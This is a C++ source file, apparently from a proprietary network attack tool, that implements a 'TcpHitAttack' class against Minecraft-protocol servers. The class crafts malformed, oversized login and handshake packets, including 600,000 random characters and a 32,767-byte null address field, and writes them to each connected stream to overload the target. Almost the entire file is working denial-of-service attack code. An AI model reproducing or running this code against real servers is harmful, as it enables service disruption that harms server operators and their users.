/*
 * All Rights Reserved
 *
 * Copyright (c) 2022 JNNGL
 *
 * Unauthorized copying and/or distributing of this software in source
 * and/or binary forms, via any medium is strictly prohibited
 *
 * Proprietary and confidential
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

#include "tcphit.h"

#include <sstream>

#include "../netutils.h"
#include "../packet/handshake.h"
#include "../packet/login_start.h"

TcpHitAttack::TcpHitAttack(int protocol) {
  std::basic_stringstream<char16_t> ss;
  for (int i = 0; i < 600000; i++) {
    ss << (char16_t) (-128 + (rand() % 256));
  }
  std::basic_string<char16_t> wstr = ss.str();
  std::string str((const char*) wstr.data(), wstr.length() * 2);

  std::string handshakeIp(32767, '\0');

  LoginStart(protocol, str).writeWrapped(buf);
  Handshake handshake(protocol, handshakeIp, 25565, Handshake::LOGIN);
  handshake.writeWrapped(buf);
  handshake.writeWrapped(buf);
}
TcpHitAttack::~TcpHitAttack() = default;

void TcpHitAttack::accept(uv_stream_t* stream, const sockaddr_in *) {
  write(stream, buf);
}
